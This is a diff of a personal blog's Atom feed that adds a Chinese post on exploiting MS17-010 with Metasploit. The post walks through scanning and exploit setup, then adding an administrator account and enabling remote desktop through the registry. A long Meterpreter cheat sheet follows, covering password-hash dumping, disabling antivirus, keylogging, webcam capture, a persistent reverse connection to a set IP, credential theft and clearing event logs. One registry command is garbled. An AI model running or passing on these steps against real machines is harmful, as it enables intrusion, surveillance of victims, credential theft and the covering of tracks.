@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://lhq159753.github.io/web.github.io/</id>
     <title>seemH</title>
-    <updated>2021-09-21T08:13:16.795Z</updated>
+    <updated>2021-09-22T11:29:12.757Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://lhq159753.github.io/web.github.io/"/>
     <link rel="self" href="https://lhq159753.github.io/web.github.io/atom.xml"/>
@@ -11,84 +11,98 @@
     <icon>https://lhq159753.github.io/web.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, seemH</rights>
     <entry>
-        <title type="html"><![CDATA[LIUNX]]></title>
-        <id>https://lhq159753.github.io/web.github.io/post/liunx/</id>
-        <link href="https://lhq159753.github.io/web.github.io/post/liunx/">
+        <title type="html"><![CDATA[如何利用  ms17-010开始进行绳渗透测试]]></title>
+        <id>https://lhq159753.github.io/web.github.io/post/ru-he-li-yong-ms17-010-kai-shi-jin-xing-sheng-shen-tou-ce-shi/</id>
+        <link href="https://lhq159753.github.io/web.github.io/post/ru-he-li-yong-ms17-010-kai-shi-jin-xing-sheng-shen-tou-ce-shi/">
         </link>
-        <updated>2021-09-20T15:44:08.000Z</updated>
-        <content type="html"><![CDATA[<pre><code>这是一篇liunx学习手册的心得🦁
+        <updated>2021-09-22T11:10:07.000Z</updated>
+        <content type="html"><![CDATA[<p>🕎</p>
+<figure data-type="image" tabindex="1"><img src="https://lhq159753.github.io/web.github.io//post-images/1632310067918.jpg" alt="" loading="lazy"></figure>
+<pre><code>在进行渗透测试之前，先进行信息获取
 
+利用nmap -Pn 扫描目标主机是否有对应的端口开启
+进入msfconsole
 
-这仅仅只是一个不如渗透的一个小开始
+打开数据库：service postgresql start
+
+数据初始化：msfdb init
+
+信息收集获取目标机的IP地址
+
+使用msfsole攻击
+
+search：漏洞模块路径查询
+
+use：使用漏洞模块
+
+show options：加载攻击模块并配置参数
+
+set ：配置参数
+
+payload;攻击荷载
+
+RHOST：目标主机地址
+
+LHOST：本机主机地址
+
+run：执行
+
+ 渗透思维导图
 </code></pre>
-<!--基础命令 -->
-<p>🐧ls  查看   ls -l查看权限                    lspci：查看网卡信息   lspci -vvv ：查看网卡驱动</p>
-<p>🐧 touch 创建文件                    ethtool -i eth0： 查看网卡驱动版本</p>
-<p>🐧 mkdir 创建目录  mkdir -p</p>
-<p>🐧 cd 进入文件或目录</p>
-<p>🐧 rm 删除</p>
-<p>🐧 cat 查看文件适合文件较少  cat -n显示行号</p>
-<p>🐧 more 查看文件适合较多 分页浏览</p>
-<p>🐧 less 查看文件可以搜索目标</p>
-<p>🐧 head  -n 查看目标文件所需要的几行</p>
-<p>🐧 mv 移动文件夹</p>
-<p>🐧 cp 复制文件 cp -p</p>
-<p>🐧 ln 生成链接文件 ln -s生成为软链接 类似于windows快捷方式</p>
-<p>🐧 useradd name 创建用户  userdel删除用户信息</p>
-<p>🐧 groupadd 创建组    groupdel删除</p>
-<p>🐧 权限更改 chmod  ugoa   +-=  rwx  文件或目录（touch  mkdir）</p>
-<p>🐧 r：读权限，用户可以读取文档的内容，如用cat，more查看</p>
-<p>🐧 w：写权限，用户可以编辑文档</p>
-<p>🐧 x：该目录具有可以被系统执行的权限</p>
-<p>🐧 x= 1 w= 2 r=4</p>
-<p>🐧  file（文件） r:cat/more/head/tail/less</p>
-<pre><code>                w:vim
-
-                 x:脚本 command
+<figure data-type="image" tabindex="2"><img src="https://lhq159753.github.io/web.github.io//post-images/1632310085495.png" alt="" loading="lazy"></figure>
+<pre><code>🏳️‍🌈🏳️‍🌈🏳️‍🌈  在使用 Meterpreter payload攻击模块下
+首先创建一个用户：net user +名字 +密码 /add
+把刚才创建的用户设置为管理员
+net localgroup administrators +名字 /add
+在卡里把win7的远程桌面服务打开
+C:\Windows\system32&gt;G ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWREORD /d 0 /f
 </code></pre>
-<p>🐧 directory（目录） r:ls</p>
-<pre><code>                           w:touch/mkdir/rmdir/rm
-
-
-
-chown：改变文件所属用户  chown user file
-
-chgrp ：改变文件或目录所属组
-
-umask -S查看权限更改默认权限
-</code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Hello Gridea]]></title>
-        <id>https://lhq159753.github.io/web.github.io/post/hello-gridea/</id>
-        <link href="https://lhq159753.github.io/web.github.io/post/hello-gridea/">
-        </link>
-        <updated>2018-12-11T16:00:00.000Z</updated>
-        <summary type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
-✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
-]]></summary>
-        <content type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
-✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
-<!-- more -->
-<p><a href="https://github.com/getgridea/gridea">Github</a><br>
-<a href="https://gridea.dev/">Gridea 主页</a><br>
-<a href="http://fehey.com/">示例网站</a></p>
-<h2 id="特性">特性👇</h2>
-<p>📝  你可以使用最酷的 <strong>Markdown</strong> 语法，进行快速创作</p>
-<p>🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片</p>
-<p>🏷️  你可以对文章进行标签分组</p>
-<p>📋  你可以自定义菜单，甚至可以创建外部链接菜单</p>
-<p>💻  你可以在 <strong>Windows</strong>，<strong>MacOS</strong> 或 <strong>Linux</strong> 设备上使用此客户端</p>
-<p>🌎  你可以使用 <strong>𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌</strong> 或 <strong>Coding Pages</strong> 向世界展示，未来将支持更多平台</p>
-<p>💬  你可以进行简单的配置，接入 <a href="https://github.com/gitalk/gitalk">Gitalk</a> 或 <a href="https://github.com/SukkaW/DisqusJS">DisqusJS</a> 评论系统</p>
-<p>🇬🇧  你可以使用<strong>中文简体</strong>或<strong>英语</strong></p>
-<p>🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力</p>
-<p>🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步</p>
-<p>🌱 当然 <strong>Gridea</strong> 还很年轻，有很多不足，但请相信，它会不停向前 🏃</p>
-<p>未来，它一定会成为你离不开的伙伴</p>
-<p>尽情发挥你的才华吧！</p>
-<p>😘 Enjoy~</p>
+<p>然后在kali终端 打开rdesktop + 目标ip地址  ：3389</p>
+<p>🌲后期渗透<br>
+sysinfo             #查看目标主机系统信息<br>
+run scraper         #查看目标主机详细信息<br>
+run hashdump        #导出密码的哈希<br>
+load kiwi           #加载<br>
+ps                  #查看目标主机进程信息<br>
+pwd                 #查看目标当前目录(windows)<br>
+getlwd              #查看目标当前目录(Linux)<br>
+search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件<br>
+download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下<br>
+upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程<br>
+PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上<br>
+idletime            #查看主机运行时间<br>
+getuid              #查看获取的当前权限<br>
+getsystem           #提权<br>
+run  killav         #关闭杀毒软件<br>
+screenshot          #截图<br>
+webcam_list         #查看目标主机的摄像头<br>
+webcam_snap         #拍照<br>
+webcam_stream       #开视频<br>
+execute  参数  -f 可执行文件   #执行可执行程序<br>
+run getgui -u hack -p 123    #创建hack用户，密码为123<br>
+run getgui -e                #开启远程桌面<br>
+keyscan_start                #开启键盘记录功能<br>
+keyscan_dump                 #显示捕捉到的键盘记录信息<br>
+keyscan_stop                 #停止键盘记录功能<br>
+uictl  disable  keyboard     #禁止目标使用键盘<br>
+uictl  enable   keyboard     #允许目标使用键盘<br>
+uictl  disable  mouse        #禁止目标使用鼠标<br>
+uictl  enable   mouse        #允许目标使用鼠标<br>
+load                         #使用扩展库<br>
+run				             #使用扩展库<br>
+run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接<br>
+192.168.27的4444端口，缺点是容易被杀毒软件查杀<br>
+portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址<br>
+clearev                       #清除日志</p>
+<p>run post/windows/manage/migrate                  #自动进程迁移<br>
+run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上<br>
+run post/windows/manage/killav                   #关闭杀毒软件<br>
+run post/windows/manage/enable_rdp               #开启远程桌面服务<br>
+run post/windows/manage/autoroute                #查看路由信息<br>
+run post/windows/gather/enum_logged_on_users     #列举当前登录的用户<br>
+run post/windows/gather/enum_applications        #列举应用程序<br>
+run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码<br>
+run windows/gather/smart_hashdump                #dump出所有用户的hash</p>
 ]]></content>
     </entry>
 </feed>
